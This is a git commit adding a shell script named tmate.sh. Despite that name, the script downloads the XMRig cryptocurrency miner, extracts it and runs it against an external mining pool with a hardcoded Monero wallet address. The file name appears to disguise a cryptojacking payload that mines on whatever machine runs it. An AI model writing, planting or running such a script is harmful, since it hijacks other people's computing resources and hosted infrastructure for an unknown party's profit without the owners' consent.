c47e2106c86a2a361db2452de40ef6eee45d47f8
maanya125 <83495427+maanya125@users.noreply.github.com>
2024-02-07 11:28:08 +0530

    Create tmate.sh

---
+++ tmate.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+# Download the file
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
+
+# Extract the tar.gz file
+tar xvzf xmrig-6.21.0-linux-x64.tar.gz
+
+# Change directory
+cd xmrig-6.21.0/
+
+# Run the xmrig command
+./xmrig -o xmr.2miners.com:2222 -u 49z57pCkv6ffJpdPsFuzNFbkJKdNL5nrQQANRTbRY36cdKyApwNRTucQHvVqEKFHW13RSLCvtEUbSTgoYiJr7a4VADENAjb.1 -k
